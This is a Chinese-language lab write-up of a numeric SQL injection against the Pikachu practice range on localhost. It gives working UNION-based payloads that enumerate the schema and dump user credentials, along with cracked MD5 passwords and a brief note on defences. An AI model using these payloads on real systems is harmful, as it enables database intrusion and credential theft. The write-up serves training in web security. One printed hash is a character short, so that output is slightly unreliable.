---
title: Pikachu 数字型SQL注入（POST）Writeup
date: 2026-10-27
category: Web漏洞复现
tags: [Web安全, SQL注入, 数字型注入, POST注入, Pikachu]
---
## 一、实验环境
靶场：Pikachu
地址：127.0.0.1/pikachu/vul/sqli/sqli_id.php
抓包工具：Burp Suite
注入类型：数字型SQL注入（参数id无引号包裹）

## 二、注入原理
数字型注入，后端SQL语句大致为：
`select username,email from users where id=$id;`
id直接拼接，不需要单引号闭合，可以直接插入and、union等SQL语句。

## 三、注入过程
1. 判断是否存在注入
- payload：`id=1 and 1=1`，返回正常数据
- payload：`id=1 and 1=2`，提示id不存在
一真一假，证明存在数字型注入。

2. order by 判断列数
- `id=1 order by 2`：正常
- `id=1 order by 3`：报错 Unknown column '3' in 'order clause'
得出：查询字段一共 **2列**。

3. union 联合查询，寻找回显位置
payload：`id=-1 union select 1,2`
页面输出 hello,1 ，your email is:2，证明第1、2位都可以回显。

4. 查询当前数据库名
payload：`id=-1 union select 1,database()`
结果：pikachu

5. 查询库中所有表
payload：
`id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`
表：httpinfo,member,message,users,xssblind
目标表：users

6. 查询users表字段
payload：
`id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'`
字段：id,username,password,level

7. 爆出账号密码
payload：
`id=-1 union select 1,group_concat(username,0x7c,password) from users`
查询结果：
admin|e10adc394ba59abbe56e057f20f883e,
pikachu|670b14728ad9902aecba32e22fa4f6bd,
test|e99a18c428cb38d5f260853678922e03

md5解密：
admin:123456
pikachu:000000
test:abc123

## 四、总结
数字型注入和字符注入区别：不需要单引号闭合，直接拼接数字条件；防御方式：参数预编译、过滤特殊关键字、强类型校验id为数字。
